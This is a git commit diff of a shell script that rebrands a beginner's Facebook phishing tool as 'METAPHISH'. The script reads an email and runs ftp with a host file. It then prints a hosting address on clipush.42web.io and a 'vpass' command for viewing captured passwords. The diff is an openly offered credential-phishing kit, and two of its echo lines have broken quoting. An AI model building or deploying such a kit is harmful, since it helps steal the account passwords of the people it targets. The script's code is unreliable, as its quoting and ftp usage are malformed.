807cd08b288bd7fb948ab3d7abe13eeff10ddcab
nerdhaka <114361549+nerdhaka@users.noreply.github.com>
2022-10-05 12:53:06 +0000

    Update fb.sh

--- fb.sh
+++ fb.sh
@@ -1,15 +1,18 @@
 clear
-echo "FB-PHISH STARTED..."
+echo "METAPHISH STARTED..."
 echo
 echo "Tool By nerdhacker000 On Github, Made For Beginners"
 echo "---------------------------------------" 
 echo "1. Type your email (YOUREMAIL)"
 echo "---------------------------------------" 
-echo "2. Type: open ftp"
+echo "2. Type:"vpass"to view passwords
 echo "---------------------------------------" 
 echo "3 Go to my website for more: nerdhaka.blogspot.com" 
 echo "Type \'1\' To Begin Process"
 echo "Enter your email:"
 read email
+echo "..."
 echo
-ftp
+ftp -s:host.txt
+echo "Successively hosted at: clipush.42web.io/$email
+echo - - - - 
